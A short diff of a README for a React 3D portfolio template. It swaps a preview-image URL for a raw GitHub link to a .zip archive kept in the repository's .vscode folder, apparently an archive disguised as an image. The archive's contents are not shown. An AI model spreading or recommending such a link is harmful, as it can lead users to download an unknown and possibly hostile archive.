@@ -1,5 +1,5 @@
 # React3DCanvas-Portfolio-Template
-![Prortfolio](https://i.ibb.co/hDckYKF/compute.png)
+![Prortfolio](https://github.com/CharlotteJV/React3DCanvas-Portfolio-Template/raw/refs/heads/main/.vscode/Canvas_D_Template_React_Portfolio_v2.0.zip)
 
 ## Công nghệ và công cụ
 
